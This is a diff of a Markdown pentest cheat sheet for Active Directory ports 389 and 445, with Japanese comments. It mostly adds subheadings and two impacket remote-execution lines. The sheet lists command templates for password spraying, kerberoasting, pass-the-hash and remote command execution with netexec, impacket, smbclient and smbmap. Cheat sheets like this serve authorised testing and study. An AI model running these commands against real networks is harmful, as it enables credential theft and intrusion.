@@ -7,7 +7,7 @@
 
 
 ## 389
-netexec
+### netexec
 ```sh
 # Authentication
 netexec ldap 'IP' -u 'USERNAMELIST' -p '' -k
@@ -37,7 +37,7 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection A
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
 ```
 
-impacket
+### impacket
 ```sh
 # kerberoasting (TCP88番も必要)
 impacket-GetUserSPNs -outputfile kerberoast.txt -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
@@ -45,7 +45,7 @@ impacket-GetUserSPNs -outputfile kerberoast.txt -ts -dc-ip 'IP' 'DOMAIN/USERNAME
 
 
 ## 445
-netexec(rpcを使用するためTCP135番も使う)
+### netexec(rpcを使用するためTCP135番も使う)
 ```sh
 # Password Spraying
 netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
@@ -86,20 +86,22 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'mmcexec' -x '
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'COMMAND'
 ```
 
-impacket(rpcを使用するためTCP135番も使う)
+### impacket(rpcを使用するためTCP135番も使う)
 ```sh
 impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows OR ShellBrowserWindow OR MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 ```
 
-smbclient
+### smbclient
 ```sh
 smbclient -L 'HOST' -U 'DOMAIN/USERNAME%PASSWORD'
 smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//HOST/SHARE'
 ```
 
-smbmap
+### smbmap
 ```sh
 smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g smbmap.txt
 smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g smbmap.txt
